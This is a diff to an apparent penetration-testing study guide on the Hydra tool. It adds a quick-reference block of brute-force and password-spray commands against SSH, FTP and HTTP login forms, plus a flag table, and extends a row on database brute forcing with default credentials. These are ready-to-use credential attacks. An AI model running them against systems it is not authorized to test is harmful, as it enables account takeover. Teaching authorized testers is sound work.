@@ -48,6 +48,49 @@
 
 ---
 
+## Quick Reference
+
+### Essential Commands
+```bash
+hydra -l admin -P rockyou.txt ssh://10.10.10.1             # SSH single user
+hydra -L users.txt -P rockyou.txt ftp://10.10.10.1         # FTP user list
+hydra -L users.txt -p 'Password1' ssh://10.10.10.1         # password spray
+hydra -C creds.txt http-get://10.10.10.1/admin             # colon-separated creds
+hydra -l admin -P rockyou.txt 10.10.10.1 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid" -V
+```
+
+### Common Scenarios
+```bash
+# SSH brute-force with threads
+hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 ssh://10.10.10.1
+
+# HTTP POST form login
+hydra -l admin -P passwords.txt 10.10.10.1 http-post-form '/login.php:username=^USER^&password=^PASS^:Login failed'
+
+# Save results
+hydra -l admin -P rockyou.txt ssh://10.10.10.1 -o hydra_results.txt
+```
+
+### Key Options
+| Flag | Meaning |
+|------|---------|
+| `-l` | Single username |
+| `-L` | Username list file |
+| `-p` | Single password |
+| `-P` | Password list file |
+| **`-C FILE`** | **C**olon-separated user:pass credential pairs file (e.g., `admin:password`) |
+| **`-c TIME`** | Global wait TIME in seconds between attempts across all threads (throttle) |
+| `-t` | Threads per target (default 16) |
+| `-V` | Verbose (show each attempt) |
+| `-o` | Output file |
+| `-s` | Non-default port |
+| `-f` | Stop after first valid credential found |
+| `-e nsr` | Try (n)ull password, (s)ame-as-username, (r)eversed username |
+
+**⚠️ Common Confusion:** `-C FILE` (uppercase) = credential pairs file. `-c TIME` (lowercase) = throttle delay. These are completely different flags!
+
+---
+
 # PHASE 1: FUNDAMENTALS
 
 ---
@@ -215,7 +258,7 @@
 | **Objective** | Brute-force database credentials for directly exposed database services. |
 | **Syntax** | MySQL: `hydra -l root -P passwords.txt <target> mysql`. PostgreSQL: `hydra -l postgres -P passwords.txt <target> postgres`. |
 | **Expected Output** | Valid database credentials. Understanding that database access = full data access = critical finding. |
-| **Common Mistakes** | Not trying default credentials first (`root:root`, `root:` (blank), `postgres:postgres`). Not checking if the database allows remote connections (MySQL defaults to localhost-only). |
+| **Common Mistakes** | Not trying default credentials first (`root:root`, `root:` (blank), `postgres:postgres`). Not checking if the database allows remote connections (MySQL defaults to localhost-only). **Note:** Modern MySQL (8.0+) blocks remote root login by default. In real engagements, target application database users, not root. Check for root access only on localhost/unix socket connections. |
 
 ---
 
